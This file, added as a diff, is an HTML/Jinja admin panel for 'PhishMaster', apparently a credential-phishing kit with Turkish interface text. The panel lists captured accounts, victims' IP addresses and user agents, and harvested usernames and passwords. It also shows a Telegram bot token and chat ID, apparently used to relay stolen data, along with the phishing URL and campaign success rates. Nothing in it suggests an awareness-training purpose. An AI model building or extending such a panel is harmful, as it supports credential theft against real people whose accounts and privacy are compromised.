@@ -1,0 +1,264 @@
+<!DOCTYPE html>
+<html lang="tr">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>PhishMaster - Admin Panel</title>
+    <script src="https://cdn.tailwindcss.com"></script>
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
+    <style>
+        body {
+            background: linear-gradient(135deg, #1a1a2e 0%, #16213e 100%);
+            color: #e2e8f0;
+            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
+        }
+        .glass-card {
+            background: rgba(255, 255, 255, 0.05);
+            backdrop-filter: blur(10px);
+            border: 1px solid rgba(255, 255, 255, 0.1);
+        }
+        .stat-card {
+            transition: all 0.3s ease;
+        }
+        .stat-card:hover {
+            transform: translateY(-3px);
+            box-shadow: 0 10px 25px rgba(0,0,0,0.2);
+        }
+        .log-entry {
+            border-left: 4px solid #4299e1;
+        }
+        .log-entry:hover {
+            background: rgba(66, 153, 225, 0.1);
+        }
+        table {
+            border-spacing: 0;
+        }
+        th {
+            position: sticky;
+            top: 0;
+            background: rgba(30, 41, 59, 0.95);
+            backdrop-filter: blur(10px);
+        }
+    </style>
+</head>
+<body class="min-h-screen">
+    <div class="container mx-auto px-4 py-8">
+        <!-- Header -->
+        <div class="flex justify-between items-center mb-8">
+            <div>
+                <h1 class="text-3xl font-bold">🎣 PhishMaster Admin Panel</h1>
+                <p class="text-gray-400">Campaign ID: {{ campaign.id }}</p>
+            </div>
+            <a href="/panel" class="px-4 py-2 bg-blue-600 hover:bg-blue-700 rounded-lg transition">
+                <i class="fas fa-arrow-left mr-2"></i> Ana Panele Dön
+            </a>
+        </div>
+
+        <!-- Stats -->
+        <div class="grid grid-cols-1 md:grid-cols-4 gap-6 mb-8">
+            <div class="glass-card rounded-xl p-6 stat-card">
+                <div class="text-3xl mb-2 text-green-400">{{ campaign.visits }}</div>
+                <div class="text-gray-400">Toplam Ziyaretçi</div>
+                <div class="text-sm text-gray-500 mt-2">
+                    <i class="fas fa-eye mr-1"></i> Son aktivite: {{ campaign.last_activity }}
+                </div>
+            </div>
+
+            <div class="glass-card rounded-xl p-6 stat-card">
+                <div class="text-3xl mb-2 text-yellow-400">{{ campaign.submissions }}</div>
+                <div class="text-gray-400">Yakalanan Hesap</div>
+                <div class="text-sm text-gray-500 mt-2">
+                    <i class="fas fa-chart-line mr-1"></i> Başarı oranı: {{ (campaign.submissions/campaign.visits*100)|round(2) if campaign.visits > 0 else 0 }}%
+                </div>
+            </div>
+
+            <div class="glass-card rounded-xl p-6 stat-card">
+                <div class="text-3xl mb-2 text-blue-400">{{ campaign.template }}</div>
+                <div class="text-gray-400">Template</div>
+                <div class="text-sm text-gray-500 mt-2">
+                    <i class="fas fa-calendar mr-1"></i> Oluşturulma: {{ campaign.created }}
+                </div>
+            </div>
+
+            <div class="glass-card rounded-xl p-6 stat-card">
+                <div class="text-3xl mb-2 {{ 'text-green-400' if campaign.active else 'text-red-400' }}">
+                    {{ 'Aktif' if campaign.active else 'Pasif' }}
+                </div>
+                <div class="text-gray-400">Durum</div>
+                <div class="text-sm text-gray-500 mt-2">
+                    <i class="fas fa-link mr-1"></i> URL: {{ campaign.url }}
+                </div>
+            </div>
+        </div>
+
+        <!-- Campaign Info -->
+        <div class="glass-card rounded-xl p-6 mb-8">
+            <h2 class="text-xl font-bold mb-4">📋 Campaign Bilgileri</h2>
+            <div class="grid grid-cols-1 md:grid-cols-2 gap-4">
+                <div>
+                    <div class="mb-2">
+                        <span class="text-gray-400">Bot Token:</span>
+                        <div class="font-mono text-sm bg-gray-900 p-2 rounded">{{ campaign.bot_token }}</div>
+                    </div>
+                    <div class="mb-2">
+                        <span class="text-gray-400">Chat ID:</span>
+                        <div class="font-mono text-sm bg-gray-900 p-2 rounded">{{ campaign.chat_id }}</div>
+                    </div>
+                </div>
+                <div>
+                    <div class="mb-2">
+                        <span class="text-gray-400">Phishing URL:</span>
+                        <a href="{{ campaign.url }}" target="_blank" class="block font-mono text-sm bg-gray-900 p-2 rounded hover:text-blue-400">
+                            {{ campaign.url }}
+                        </a>
+                    </div>
+                    <div class="mb-2">
+                        <span class="text-gray-400">Admin URL:</span>
+                        <div class="font-mono text-sm bg-gray-900 p-2 rounded">{{ request.url }}</div>
+                    </div>
+                </div>
+            </div>
+        </div>
+
+        <!-- Logs -->
+        <div class="glass-card rounded-xl p-6">
+            <div class="flex justify-between items-center mb-6">
+                <h2 class="text-xl font-bold">📝 Yakalanan Bilgiler ({{ logs|length }})</h2>
+                <button onclick="refreshLogs()" class="px-4 py-2 bg-green-600 hover:bg-green-700 rounded-lg">
+                    <i class="fas fa-sync-alt mr-2"></i> Yenile
+                </button>
+            </div>
+
+            {% if logs %}
+            <div class="overflow-x-auto">
+                <table class="w-full">
+                    <thead>
+                        <tr class="text-left">
+                            <th class="pb-3 pl-2">ID</th>
+                            <th class="pb-3">IP Adresi</th>
+                            <th class="pb-3">Zaman</th>
+                            <th class="pb-3">Bilgiler</th>
+                            <th class="pb-3 pr-2">User Agent</th>
+                        </tr>
+                    </thead>
+                    <tbody>
+                        {% for log in logs %}
+                        <tr class="log-entry border-t border-gray-800 hover:bg-gray-900/50">
+                            <td class="py-3 pl-2">{{ log.id }}</td>
+                            <td class="py-3">
+                                <span class="font-mono text-sm">{{ log.ip }}</span>
+                            </td>
+                            <td class="py-3">
+                                <span class="text-gray-400">{{ log.time }}</span>
+                            </td>
+                            <td class="py-3">
+                                <div class="space-y-1">
+                                    {% for key, value in log.credentials.items() %}
+                                    <div>
+                                        <span class="text-gray-400">{{ key }}:</span>
+                                        <span class="ml-2 font-mono text-sm">{{ value }}</span>
+                                    </div>
+                                    {% endfor %}
+                                </div>
+                            </td>
+                            <td class="py-3 pr-2">
+                                <div class="text-xs text-gray-500 max-w-xs truncate" title="{{ log.user_agent }}">
+                                    {{ log.user_agent[:50] }}...
+                                </div>
+                            </td>
+                        </tr>
+                        {% endfor %}
+                    </tbody>
+                </table>
+            </div>
+            {% else %}
+            <div class="text-center py-12">
+                <div class="text-5xl mb-4 text-gray-600">
+                    <i class="fas fa-inbox"></i>
+                </div>
+                <h3 class="text-xl text-gray-400 mb-2">Henüz veri yakalanmadı</h3>
+                <p class="text-gray-500">Campaign'iniz henüz hiç ziyaret edilmedi.</p>
+            </div>
+            {% endif %}
+        </div>
+
+        <!-- Quick Actions -->
+        <div class="mt-6 flex space-x-4">
+            <button onclick="toggleCampaign()"
+                    class="px-6 py-3 rounded-lg {{ 'bg-yellow-600 hover:bg-yellow-700' if campaign.active else 'bg-green-600 hover:bg-green-700' }}">
+                <i class="fas fa-power-off mr-2"></i>
+                {{ 'Pasif Yap' if campaign.active else 'Aktif Yap' }}
+            </button>
+
+            <button onclick="copyURL()" class="px-6 py-3 bg-blue-600 hover:bg-blue-700 rounded-lg">
+                <i class="fas fa-copy mr-2"></i> URL'yi Kopyala
+            </button>
+
+            <button onclick="sendTest()" class="px-6 py-3 bg-purple-600 hover:bg-purple-700 rounded-lg">
+                <i class="fas fa-paper-plane mr-2"></i> Test Mesajı Gönder
+            </button>
+
+            <button onclick="deleteCampaign()" class="px-6 py-3 bg-red-600 hover:bg-red-700 rounded-lg">
+                <i class="fas fa-trash mr-2"></i> Campaign'i Sil
+            </button>
+        </div>
+    </div>
+
+    <script>
+        const campaignId = '{{ campaign.id }}';
+
+        function refreshLogs() {
+            window.location.reload();
+        }
+
+        function copyURL() {
+            const url = '{{ campaign.url }}';
+            navigator.clipboard.writeText(url).then(() => {
+                alert('URL panoya kopyalandı!');
+            });
+        }
+
+        async function toggleCampaign() {
+            const response = await fetch(`/api/campaign/${campaignId}/toggle`, {
+                method: 'POST'
+            });
+
+            if (response.ok) {
+                alert('Campaign durumu değiştirildi!');
+                window.location.reload();
+            }
+        }
+
+        async function sendTest() {
+            const response = await fetch(`/capture/${campaignId}`, {
+                method: 'POST',
+                headers: {'Content-Type': 'application/json'},
+                body: JSON.stringify({
+                    test: 'true',
+                    username: 'test_user',
+                    password: 'test_password',
+                    message: 'Bu bir test mesajıdır.'
+                })
+            });
+
+            if (response.ok) {
+                alert('Test mesajı gönderildi!');
+            }
+        }
+
+        function deleteCampaign() {
+            if (confirm('Bu campaigni ve tüm loglarını silmek istediğinize emin misiniz?')) {
+                fetch(`/api/campaign/${campaignId}/delete`, {
+                    method: 'POST'
+                }).then(() => {
+                    alert('Campaign silindi!');
+                    window.location.href = '/panel';
+                });
+            }
+        }
+
+        // Auto-refresh every 30 seconds
+        setInterval(refreshLogs, 30000);
+    </script>
+</body>
+</html>
